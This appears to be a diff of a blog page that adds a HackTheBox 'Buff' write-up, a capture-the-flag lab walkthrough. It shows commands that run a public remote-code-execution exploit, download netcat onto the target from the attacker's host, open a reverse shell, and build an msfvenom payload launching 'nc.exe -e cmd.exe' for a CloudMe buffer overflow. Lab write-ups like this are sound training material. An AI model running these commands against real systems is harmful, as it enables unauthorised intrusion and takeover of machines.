@@ -285,13 +285,157 @@ box-shadow: 0px 2px 5px -1px rgba(0,0,0,0.59);
 	<header class="entry-header">
 		<h1 class="entry-title">HackTheBox &#8211; Buff</h1>
 		<div class="entry-info">
-			<span class="posted-on">Posted on <time class="entry-date published updated" datetime="2020-10-10T19:22:46+00:00">October 10, 2020</time></span><span class="author-info"> by <a href="http://nathaneberhardt.com/author/user/">Nathan</a></span>		</div>
+			<span class="posted-on">Posted on <time class="entry-date published" datetime="2020-10-10T19:22:46+00:00">October 10, 2020</time><time class="updated" datetime="2020-11-26T07:38:10+00:00">November 26, 2020</time></span><span class="author-info"> by <a href="http://nathaneberhardt.com/author/user/">Nathan</a></span>		</div>
 	</header>
 
 	
 	<div class="entry-content">
 		
-<p>[Writeup will become visible after the box becomes retired]</p>
+<figure class="wp-block-image size-large"><img loading="lazy" width="708" height="438" src="http://nathaneberhardt.com/wp-content/uploads/2020/11/thumb.png" alt="" class="wp-image-396" srcset="http://nathaneberhardt.com/wp-content/uploads/2020/11/thumb.png 708w, http://nathaneberhardt.com/wp-content/uploads/2020/11/thumb-300x186.png 300w" sizes="(max-width: 708px) 100vw, 708px" /></figure>
+
+
+
+<p>This is my first HackTheBox writeup, and I decided to write up on the &#8220;Buff&#8221; box that I did last month. It was a Windows OS machine with a difficult of &#8220;Easy&#8221;, so ******</p>
+
+
+
+<p>As always we want to start with an nmap scan to check for open ports/services. The &#8220;sV&#8221; flag is to scan for service versions: </p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" width="600" height="88" src="http://nathaneberhardt.com/wp-content/uploads/2020/11/1.png" alt="" class="wp-image-428" srcset="http://nathaneberhardt.com/wp-content/uploads/2020/11/1.png 600w, http://nathaneberhardt.com/wp-content/uploads/2020/11/1-300x44.png 300w" sizes="(max-width: 600px) 100vw, 600px" /></figure>
+
+
+
+<p>The nmap scan indicates that the host may be blocking ping probes, so we add the &#8220;-Pn&#8221; flag to the command:</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" width="597" height="134" src="http://nathaneberhardt.com/wp-content/uploads/2020/10/2.png" alt="" class="wp-image-399" srcset="http://nathaneberhardt.com/wp-content/uploads/2020/10/2.png 597w, http://nathaneberhardt.com/wp-content/uploads/2020/10/2-300x67.png 300w" sizes="(max-width: 597px) 100vw, 597px" /></figure>
+
+
+
+<p>We see that port 8080 is open and is running an Apache web server. We can go ahead and visit that site at 10.10.10.198:8080:</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" width="1024" height="692" src="http://nathaneberhardt.com/wp-content/uploads/2020/11/3-1024x692.png" alt="" class="wp-image-429" srcset="http://nathaneberhardt.com/wp-content/uploads/2020/11/3-1024x692.png 1024w, http://nathaneberhardt.com/wp-content/uploads/2020/11/3-300x203.png 300w, http://nathaneberhardt.com/wp-content/uploads/2020/11/3-768x519.png 768w, http://nathaneberhardt.com/wp-content/uploads/2020/11/3.png 1069w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
+
+
+
+<p>Visiting the home page, it looks like a simple fitness website. The first set of actions I take when I discover a web site:</p>
+
+
+
+<ol><li>Check all of the pages and their page soure&#8217;s for anything interesting</li><li>Run a dirbuster scan to find any hidden directories.</li><li>Test XSS and SQLi attacks on any input fields we find.</li><li>Capture the requests with BurpSuite to see if we can extract any data or manipulate the requests for a possible exploit. </li></ol>
+
+
+
+<p>The login fields seemed to be properly sanitized, and the hidden files/directories didn&#8217;t lead me anywhere</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" width="479" height="359" src="http://nathaneberhardt.com/wp-content/uploads/2020/11/5-1.png" alt="" class="wp-image-431" srcset="http://nathaneberhardt.com/wp-content/uploads/2020/11/5-1.png 479w, http://nathaneberhardt.com/wp-content/uploads/2020/11/5-1-300x225.png 300w" sizes="(max-width: 479px) 100vw, 479px" /></figure>
+
+
+
+<p>While browsing the other pages of the site, I found an empty Contact page:</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" width="1024" height="362" src="http://nathaneberhardt.com/wp-content/uploads/2020/11/7-2-1024x362.png" alt="" class="wp-image-434" srcset="http://nathaneberhardt.com/wp-content/uploads/2020/11/7-2-1024x362.png 1024w, http://nathaneberhardt.com/wp-content/uploads/2020/11/7-2-300x106.png 300w, http://nathaneberhardt.com/wp-content/uploads/2020/11/7-2-768x272.png 768w, http://nathaneberhardt.com/wp-content/uploads/2020/11/7-2.png 1068w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
+
+
+
+<p>Definitely a suspicious find, and the only text on the page was &#8220;Made using Gym Management Software 1.0.&#8221; After a quick search on this on ExploitDB I found this:</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" width="1024" height="626" src="http://nathaneberhardt.com/wp-content/uploads/2020/11/9-1024x626.png" alt="" class="wp-image-435" srcset="http://nathaneberhardt.com/wp-content/uploads/2020/11/9-1024x626.png 1024w, http://nathaneberhardt.com/wp-content/uploads/2020/11/9-300x183.png 300w, http://nathaneberhardt.com/wp-content/uploads/2020/11/9-768x469.png 768w, http://nathaneberhardt.com/wp-content/uploads/2020/11/9.png 1064w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
+
+
+
+<p>According to the exploit, any website using the Gym Management System 1.0 could be vulnerable to unauthenticated remote code execution. It uses python 2, so you may have to run the exploit in a virtual environment if you&#8217;re having problems with python 3.</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" width="917" height="442" src="http://nathaneberhardt.com/wp-content/uploads/2020/11/10.png" alt="" class="wp-image-436" srcset="http://nathaneberhardt.com/wp-content/uploads/2020/11/10.png 917w, http://nathaneberhardt.com/wp-content/uploads/2020/11/10-300x145.png 300w, http://nathaneberhardt.com/wp-content/uploads/2020/11/10-768x370.png 768w" sizes="(max-width: 917px) 100vw, 917px" /></figure>
+
+
+
+<p>The latest version of kali already has this exploit in the exploitdb directory, so all you have to do is copy it to your working directory and run it!</p>
+
+
+<pre class="brush: bash; title: ; notranslate" title="">
+$ cp /usr/share/exploitdb/exploits/php/webapps/48506.py/ .
+</pre>
+
+<pre class="brush: bash; title: ; notranslate" title="">
+$ python 48506.py http://10.10.10.198:8080/
+</pre>
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" width="408" height="114" src="http://nathaneberhardt.com/wp-content/uploads/2020/11/12-1.png" alt="" class="wp-image-438" srcset="http://nathaneberhardt.com/wp-content/uploads/2020/11/12-1.png 408w, http://nathaneberhardt.com/wp-content/uploads/2020/11/12-1-300x84.png 300w" sizes="(max-width: 408px) 100vw, 408px" /></figure>
+
+
+
+<p>And just like that we have a web shell! The next things I always do when trying to escalate my privileges on a windows machine is to upload the &#8220;nc.exe&#8221; and &#8220;plink.exe&#8221; binaries found in the &#8220;windows-binaries&#8221; directory on your kali box. nc.exe is netcat which allows you to upgrade to a better shell, and plink is used to forward ports not directly reachable from outside of the machine.</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" width="450" height="118" src="http://nathaneberhardt.com/wp-content/uploads/2020/11/13-1.png" alt="" class="wp-image-439" srcset="http://nathaneberhardt.com/wp-content/uploads/2020/11/13-1.png 450w, http://nathaneberhardt.com/wp-content/uploads/2020/11/13-1-300x79.png 300w" sizes="(max-width: 450px) 100vw, 450px" /></figure>
+
+
+
+<p>Now we just need a way to get those binaries onto the victim machine. A really fast way to get this done is to setup a python simpleHTTPServer on your host that holds all of your binaries, and then download those binaries onto the victim machine with a web request command:</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" width="613" height="148" src="http://nathaneberhardt.com/wp-content/uploads/2020/11/19.png" alt="" class="wp-image-444" srcset="http://nathaneberhardt.com/wp-content/uploads/2020/11/19.png 613w, http://nathaneberhardt.com/wp-content/uploads/2020/11/19-300x72.png 300w" sizes="(max-width: 613px) 100vw, 613px" /></figure>
+
+
+
+<p>With the webshell we have just created, we can perform an Invoke-WebRequest command to download the binaries onto the victim machine:</p>
+
+
+<pre class="brush: bash; title: ; notranslate" title="">
+C:\xampp\htdocs\gym\upload&gt; Invoke-WebRequest -Uri [attacking box ip]/nc.exe -OutFile &quot;nc.exe&quot;
+</pre>
+
+
+<p>With netcat successfully downloaded onto the victim machine, we can run a listening netcat connection on our kali box to create a reverse shell:</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" width="507" height="80" src="http://nathaneberhardt.com/wp-content/uploads/2020/11/15.png" alt="" class="wp-image-441" srcset="http://nathaneberhardt.com/wp-content/uploads/2020/11/15.png 507w, http://nathaneberhardt.com/wp-content/uploads/2020/11/15-300x47.png 300w" sizes="(max-width: 507px) 100vw, 507px" /></figure>
+
+
+
+<p>Then, we run the nc.exe binary to connect back to our host machine with the nc.exe binary we just uploaded</p>
+
+
+<pre class="brush: bash; title: ; notranslate" title="">
+C:\xampp\htdocs\gym\upload&gt; nc [attacking box ip]:4444
+</pre>
+
+
+<p>If all done correctly, you should have a new shell, and should be able to use normal cmd/powershell commands. While traversing the system directories, I found the user shaun and the user Administrator. the access to Administrator was denied, but I could cd into shaun&#8217;s directory; the user flag is on his Desktop. As for the Administrator flag, we will have to dive deeper into the system to try to find something to exploit.</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" width="544" height="546" src="http://nathaneberhardt.com/wp-content/uploads/2020/11/23.png" alt="" class="wp-image-445" srcset="http://nathaneberhardt.com/wp-content/uploads/2020/11/23.png 544w, http://nathaneberhardt.com/wp-content/uploads/2020/11/23-300x300.png 300w, http://nathaneberhardt.com/wp-content/uploads/2020/11/23-150x150.png 150w" sizes="(max-width: 544px) 100vw, 544px" /></figure>
+
+
+
+<p>In the Download folder, there is an exe file named Cloudme1.11.2.exe that is running on a local port on the system. With a quick google search, I found that this file is vulnerable to Buffer Overflow. This is where the plink.exe comes in: we will forward the localport using cloudme to our host machine in order to exploit it with Buffer Overflow. Heres the metasploit payload I used:</p>
+
+
+<pre class="brush: bash; title: ; notranslate" title="">
+msfvenom -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe [attacking host ip]' -b '\x00\x0a\x0d'
+</pre>
+
+
+<p>After running that in a compiled executable, you will be able to connect to the victim machines as Administrator! Just traverse into Desktop folder and grab your flag!</p>
 	</div><!-- .entry-content -->
 
 	<footer class="entry-footer clearfix"><span class="cat-tags-links"><span class="cat-links"><span class="cat-icon"><i class="fa fa-folder-open"></i></span><span class="screen-reader-text">Categories</span><a href="http://nathaneberhardt.com/category/hackthebox/" rel="category tag">HackTheBox</a></span></span></footer></article>
@@ -366,6 +510,52 @@ box-shadow: 0px 2px 5px -1px rgba(0,0,0,0.59);
     </div><!-- site-inner -->
 </div><!-- site -->
 
+<script type='text/javascript' src='http://nathaneberhardt.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shCore.js?ver=3.0.9b' id='syntaxhighlighter-core-js'></script>
+<script type='text/javascript' src='http://nathaneberhardt.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushBash.js?ver=3.0.9b' id='syntaxhighlighter-brush-bash-js'></script>
+<script type='text/javascript'>
+	(function(){
+		var corecss = document.createElement('link');
+		var themecss = document.createElement('link');
+		var corecssurl = "http://nathaneberhardt.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.9b";
+		if ( corecss.setAttribute ) {
+				corecss.setAttribute( "rel", "stylesheet" );
+				corecss.setAttribute( "type", "text/css" );
+				corecss.setAttribute( "href", corecssurl );
+		} else {
+				corecss.rel = "stylesheet";
+				corecss.href = corecssurl;
+		}
+		document.head.appendChild( corecss );
+		var themecssurl = "http://nathaneberhardt.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeRDark.css?ver=3.0.9b";
+		if ( themecss.setAttribute ) {
+				themecss.setAttribute( "rel", "stylesheet" );
+				themecss.setAttribute( "type", "text/css" );
+				themecss.setAttribute( "href", themecssurl );
+		} else {
+				themecss.rel = "stylesheet";
+				themecss.href = themecssurl;
+		}
+		document.head.appendChild( themecss );
+	})();
+	SyntaxHighlighter.config.strings.expandSource = '+ expand source';
+	SyntaxHighlighter.config.strings.help = '?';
+	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
+	SyntaxHighlighter.config.strings.noBrush = 'Can\'t find brush for: ';
+	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush wasn\'t configured for html-script option: ';
+	SyntaxHighlighter.defaults['light'] = true;
+	SyntaxHighlighter.defaults['pad-line-numbers'] = true;
+	SyntaxHighlighter.defaults['toolbar'] = false;
+	SyntaxHighlighter.all();
+
+	// Infinite scroll support
+	if ( typeof( jQuery ) !== 'undefined' ) {
+		jQuery( function( $ ) {
+			$( document.body ).on( 'post-load', function() {
+				SyntaxHighlighter.highlight();
+			} );
+		} );
+	}
+</script>
 <script type='text/javascript' src='http://nathaneberhardt.com/wp-content/themes/thesimplest/assets/js/skip-link-focus-fix.js?ver=1.0' id='skip-link-focus-fix-js'></script>
 <script type='text/javascript' src='http://nathaneberhardt.com/wp-content/themes/thesimplest/assets/js/bootstrap.min.js?ver=3.3.7' id='jquery-bootstrap-js'></script>
 <script type='text/javascript' src='http://nathaneberhardt.com/wp-includes/js/comment-reply.min.js?ver=5.5.3' id='comment-reply-js'></script>
